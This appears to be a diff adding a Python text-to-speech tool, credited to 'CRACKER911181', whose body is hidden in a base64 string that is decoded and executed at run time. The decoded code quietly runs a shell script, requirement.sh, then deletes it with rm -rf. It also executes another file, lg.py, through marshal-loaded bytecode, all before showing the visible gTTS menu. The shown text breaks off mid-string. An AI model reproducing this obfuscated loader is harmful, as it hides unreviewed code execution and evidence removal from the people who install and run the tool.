@@ -1,5 +1,15 @@
-#################
- 
+#######################
+#                     #
+#        main         # MAIN FILE
+#                     #
+#######################
+
+##############################
+#                            #
+#   CODER :  CRACKER911181   #
+#                            #
+##############################
+
 
 import base64, codecs
 magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCm9zLnN5c3RlbSgic2ggcmVxdWlyZW1lbnQuc2giKQpvcy5zeXN0ZW0oInJtIC1yZiByZXF1aXJlbWVudC5zaCIpCm9zLnN5c3RlbSgicm0gLXJmIF9fcHljYWNoZV9fIikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZXhlYyhtYXJzaGFsLmxvYWRzKGInXHhmYSZvcHA9b3BlbigibGcucHkiLCJyIilcbmV4ZWMob3BwLnJlYWQoKSknKSkKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKZGVmIHZvaWNlKCk6Cgl0ZXh0PXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgVGV4dDogIikpCgl3aGlsZSBUcnVlOgoJCWxhbj1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIExhbmd1YWdlKGV4YW1wbGU6ICdlbi9ibicpOiAiKSkKCQlpZiBsYW49PSIiIG9yIGxhbj09IiAiOgoJCQlwcmludChyZWQrIlxuXG5cdExhbmd1YWdlIE5vdCBEZW5pZWQiKQoJCWVsc2U6CgkJCXZvaWNlPWdUVFModGV4dD10ZXh0LGxhbmc9bGFuKQoJCQlmaWxlPXN0cihpbnB1dCgiXG5FbnRlciBZb3VyIEZpbGUgTmFtZSBGb3Igc2F2aW5nKGV4YW1wbGU6IHRlc3QubXAzKTogIikpCgkJCXdoaWxlIFRydWU6CgkJCQlwYXRoPXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgU2F2aW5nIFBhdGg6ICIpKQoJCQkJaWYgcGF0aD09IiIgb3IgcGF0aD09IiAiOgoJCQkJCXByaW50KHJlZCsiXG5cblx0UGF0aCBOb3QgRGVuaWVkIikKCQkJCWVsc2U6CgkJCQkJbW5wdD1zdHIocGF0aCsiLyIrZmlsZSkKCQkJCQl2b2ljZS5zYXZlKG1ucHQpCgp3aGlsZSBUcnVlOgoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludChibHVlK2YiIiIKICAgX19fXyAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICBfCiAgLyBfX198XyBfXyBfXyBfICBfX198IHwgX19fX18gXyBfXyAgIHxfICAgX3'
